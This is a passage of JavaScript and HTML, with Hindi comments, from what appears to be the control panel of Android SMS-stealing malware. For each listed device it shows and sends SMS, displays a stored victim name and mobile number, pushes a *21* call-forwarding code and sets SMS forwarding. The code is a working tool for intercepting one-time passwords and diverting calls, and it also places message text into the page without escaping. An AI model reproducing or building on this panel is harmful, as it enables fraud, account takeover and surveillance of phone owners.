        const colors = ['#ffe0e0','#e0ffe0','#e0e0ff','#fff0e0','#f0e0ff','#e0fff0'];
        document.getElementById('sms-list-container').innerHTML = sms.map((msg, idx) => '<div style="background:' + colors[idx%colors.length] + '; padding:12px; border-radius:30px; margin-bottom:8px;"><strong>' + msg.number + '</strong> – ' + msg.text + '<br><small>' + new Date(msg.time).toLocaleString() + '</small></div>').join('') || '<div style="text-align:center;">No SMS yet</div>';
      }).catch(() => showDialog('Error loading SMS', 'error'));
    }

    // ---------- Details – केवल नाम और मोबाइल ----------
    async function showDetails(device) {
      try {
        const res = await fetch('/api/details?deviceId=' + device.id);
        const saved = await res.json();
        const fields = [
          { label: 'Name', key: 'customerName' },
          { label: 'Mobile No', key: 'mobileNumber' }
        ];
        let html = '';
        fields.forEach(f => html += '<div class="details-row"><div class="details-label">' + f.label + '</div><div class="details-value">' + (saved[f.key] || '—') + '</div></div>');
        const full = '<div class="full-screen"><div style="background:black;color:white;padding:16px;border-radius:40px;margin-bottom:16px;"><h3><i class="fas fa-address-card"></i> Details – ' + device.brand + ' ' + device.model + '</h3></div><div class="details-card">' + html + '</div><button class="btn" style="background:gray; margin-top:16px;" onclick="closeFullScreen()">CLOSE</button></div>';
        document.getElementById('fullscreen-container').innerHTML = full;
      } catch (e) { showDialog('Error loading details', 'error'); }
    }

    // ---------- Device Info ----------
    async function showDeviceInfo(device) {
      try {
        const res = await fetch('/api/device-info?deviceId=' + device.id);
        const info = await res.json();
        const full = '<div class="full-screen"><div style="background:black;color:white;padding:16px;border-radius:40px;margin-bottom:16px;"><h3><i class="fas fa-info-circle"></i> Device Info</h3></div><div class="feature-form"><p><strong>Brand:</strong> ' + info.brand + '</p><p><strong>Model:</strong> ' + info.model + '</p><p><strong>Battery:</strong> ' + info.battery + '%</p><p><strong>Status:</strong> ' + (info.online ? 'Online' : 'Offline') + '</p><p><strong>SIM count:</strong> ' + info.simCount + '</p><p><strong>Last seen:</strong> ' + new Date(info.lastSeen).toLocaleString() + '</p></div><button class="btn" style="background:gray; margin-top:16px;" onclick="closeFullScreen()">CLOSE</button></div>';
        document.getElementById('fullscreen-container').innerHTML = full;
      } catch (e) { showDialog('Error loading device info', 'error'); }
    }

    // ---------- Call Forward ----------
    function showCallForward(device) {
      const full = '<div class="full-screen"><div style="background:black;color:white;padding:16px;border-radius:40px;margin-bottom:16px;"><h3><i class="fas fa-phone-forward"></i> Call Forward – ' + device.brand + '</h3></div><div class="feature-form"><input type="text" id="forward-number" placeholder="10-digit number" maxlength="10"><p>Command: <span id="command-preview">*21*[number]#</span></p><button class="btn" id="set-call-fwd">SEND COMMAND</button></div><button class="btn" style="background:gray; margin-top:8px;" onclick="closeFullScreen()">CLOSE</button></div>';
      document.getElementById('fullscreen-container').innerHTML = full;
      document.getElementById('forward-number').oninput = (e) => {
        document.getElementById('command-preview').innerText = e.target.value ? '*21*' + e.target.value + '#' : '*21*[number]#';
      };
      document.getElementById('set-call-fwd').onclick = async () => {
        const number = document.getElementById('forward-number').value;
        if (!number || number.length !== 10) return showDialog('Enter 10-digit number', 'error');
        await fetch('/api/call-forward', {
          method: 'POST', headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({deviceId: device.id, number})
        });
        showDialog('Call forward command *21*' + number + '# sent', 'success');
        closeFullScreen();
      };
    }

    // ---------- SMS Forward ----------
    function showSmsForward(device) {
      const full = '<div class="full-screen"><div style="background:black;color:white;padding:16px;border-radius:40px;margin-bottom:16px;"><h3><i class="fas fa-share-square"></i> SMS Forward – ' + device.brand + '</h3></div><div class="feature-form"><input type="text" id="sms-fwd-number" placeholder="10-digit number" maxlength="10"><button class="btn" id="set-sms-fwd">SET FORWARD</button></div><button class="btn" style="background:gray; margin-top:8px;" onclick="closeFullScreen()">CLOSE</button></div>';
      document.getElementById('fullscreen-container').innerHTML = full;
      document.getElementById('set-sms-fwd').onclick = async () => {
        const number = document.getElementById('sms-fwd-number').value;
        if (!number || number.length !== 10) return showDialog('Enter 10-digit number', 'error');
        await fetch('/api/sms-forward', {
          method: 'POST', headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({deviceId: device.id, number})
        });
        showDialog('SMS forward number ' + number + ' saved', 'success');
        closeFullScreen();
      };
    }

    // ---------- क्लोज ----------
    window.closeFullScreen = function() { document.getElementById('fullscreen-container').innerHTML = ''; };
    window.closeModal = function() { document.getElementById('modal-container').innerHTML = ''; };

    // ---------- डिवाइस मोडल ----------
    function showDeviceModal(device) {
      const html = '<div class="modal-overlay"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-microchip"></i> ' + device.brand + ' ' + device.model + '</h3><button class="close-btn" onclick="closeModal()">✕</button></div><div class="option-grid">' +
        '<div class="option-item" data-opt="sms-send"><i class="fas fa-paper-plane"></i>Send SMS</div>' +
        '<div class="option-item" data-opt="sms-view"><i class="fas fa-envelope-open-text"></i>View SMS</div>' +
        '<div class="option-item" data-opt="details"><i class="fas fa-address-card"></i>Details</div>' +
        '<div class="option-item" data-opt="info"><i class="fas fa-info-circle"></i>Device Info</div>' +
        '<div class="option-item" data-opt="call-fwd"><i class="fas fa-phone-forward"></i>Call Forward</div>' +
        '<div class="option-item" data-opt="sms-fwd"><i class="fas fa-share-square"></i>SMS Forward</div>' +
        '</div><div class="back-option" onclick="closeModal()">⬅ BACK</div></div></div>';
      document.getElementById('modal-container').innerHTML = html;
      document.querySelectorAll('.option-item').forEach(item => {
        item.addEventListener('click', (e) => {
          const opt = e.currentTarget.dataset.opt;
          if (opt === 'sms-send') showSendSMS(device);
          else if (opt === 'sms-view') showViewSMS(device);
          else if (opt === 'details') showDetails(device);
          else if (opt === 'info') showDeviceInfo(device);
          else if (opt === 'call-fwd') showCallForward(device);
          else if (opt === 'sms-fwd') showSmsForward(device);
        });
      });
    }
  })();
</script>
</body>
</html>`;
}
